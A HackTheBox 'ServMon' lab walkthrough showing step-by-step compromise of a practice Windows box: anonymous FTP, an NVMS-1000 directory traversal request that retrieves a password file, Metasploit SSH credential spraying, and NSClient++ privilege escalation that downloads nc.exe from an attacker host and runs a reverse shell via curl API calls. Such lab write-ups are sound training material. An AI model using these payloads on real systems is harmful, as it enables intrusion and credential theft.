---
title: "HackTheBox - ServMon | Walkthrough"
date: 2020-06-20
categories: [hackthebox]
tags: [hackthebox, windows, ftp]
---

As always, let's start with an nmap scan:

```bash
ports=$(nmap -p- --min-rate=1000 -T4 10.10.10.184 | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)
nmap -A -p$ports 10.10.10.184 -o nmap
````

We see quite a few ports open. Let's check FTP first, as anonymous login is enabled.

```bash
ftp 10.10.10.184 # login as anonymous
ftp> ls
01-18-20  12:05PM       <DIR>          Users
ftp> ls Users
01-18-20  12:06PM       <DIR>          Nadine
01-18-20  12:08PM       <DIR>          Nathan
ftp> ls Users/Nadine
01-18-20  12:08PM                  174 Confidential.txt
ftp> ls Users/Nathan
01-18-20  12:10PM                  186 Notes to do.txt
```

So, we have a few interesting files. Let's get them.

```bash
ftp> cd Users/Nadine/
ftp> get Confidential.txt
ftp> cd ../Nathan/
ftp> get Notes\ to\ do.txt
```

Check if we have write permissions:

```bash
ftp> mkdir test
550 Access is denied.
```

No write access. Let's read the files.

```bash
cat Confidential.txt
```

```
Nathan,

I left your Passwords.txt file on your Desktop. Please remove this once you have edited it yourself and place it back into the secure folder.

Regards
Nadine
```

So there’s a `Passwords.txt` in Nathan’s Desktop.

```bash
cat Notes\ to\ do.txt
```

```
1) Change the password for NVMS - Complete
2) Lock down the NSClient Access - Complete
3) Upload the passwords
4) Remove public access to NVMS
5) Place the secret files in SharePoint
```

Okay, let’s check the website.

```bash
curl http://10.10.10.184/
```

We see a redirect to `Pages/login.htm`. Opening in Firefox, the page title is **NVMS-1000**. Let's check for exploits.

```bash
searchsploit NVMS
```

We find a directory traversal exploit. Let's test it in Burp.

```http
GET /../../../../../../../../../../../../windows/win.ini HTTP/1.1
Host: 10.10.10.184
```

Response:

```
; for 16-bit app support
[fonts]
[extensions]
[mci extensions]
[files]
[Mail]
MAPI=1
```

Great, now let’s try Nathan’s desktop.

```http
GET /../../../../../../../../../../../../Users/Nathan/Desktop/Passwords.txt HTTP/1.1
Host: 10.10.10.184
```

Response:

```
1nsp3ctTh3Way2Mars!
Th3r34r3To0M4nyTrait0r5!
B3WithM30r4ga1n5tMe
L1k3B1gBut7s@W0rk
0nly7h3y0unGWi11F0l10w
IfH3s4b0Utg0t0H1sH0me
Gr4etN3w5w17hMySk1Pa5$
```

Save them:

```bash
vi pass.txt
```

User list:

```bash
vi users.txt
```

```
Nadine
Nathan
Administrator
```

Now spray credentials with Metasploit:

```bash
msfconsole
use auxiliary/scanner/ssh/ssh_login
set rhosts 10.10.10.184
set user_file users.txt
set pass_file pass.txt
run
```

Success:

```
[+] 10.10.10.184:22 - Success: 'Nadine:L1k3B1gBut7s@W0rk'
```

SSH in:

```bash
ssh Nadine@10.10.10.184
```

And we get a Windows shell!

```
Microsoft Windows [Version 10.0.18363.752]
nadine@SERVMON C:\Users\Nadine>
```

---

### Privilege Escalation

From Nathan’s notes, NSClient is installed. Let's check for exploits.

```bash
searchsploit nsclient
```

Yes, we find a privilege escalation exploit.

Check `nsclient.ini`:

```powershell
cd "C:\Program Files\NSClient++"
type .\nsclient.ini
```

We see:

```
password = ew2x6SsGTxjRwXOT
allowed hosts = 127.0.0.1
```

Perfect. Now prepare a reverse shell.

```powershell
cd C:\Temp\
powershell -c "(new-object System.Net.WebClient).DownloadFile('http://10.10.14.80:80/nc.exe','C:\Temp\nc.exe')"
```

Create a batch file:

```bash
vi evil.bat
```

```bat
@echo off
C:\Temp\nc.exe 10.10.14.78 4444 -e cmd.exe
```

Download it:

```powershell
powershell -c "(new-object System.Net.WebClient).DownloadFile('http://10.10.14.80:80/evil.bat','C:\Temp\abhizer.bat')"
```

Forward the NSClient port:

```bash
ssh Nadine@10.10.10.184 -L 8443:127.0.0.1:8443
```

Upload the script:

```bash
curl -s -k -u admin:ew2x6SsGTxjRwXOT -X PUT https://localhost:8443/api/v1/scripts/ext/scripts/abhizer.bat --data-binary @evil.bat
```

Start a listener:

```bash
nc -nvlp 4444
```

Execute the script:

```bash
curl -s -k -u admin:ew2x6SsGTxjRwXOT "https://127.0.0.1:8443/api/v1/queries/abhizer/commands/execute?time=1s"
```

Boom! You should have a reverse shell as **Administrator**.

**Rooted!**

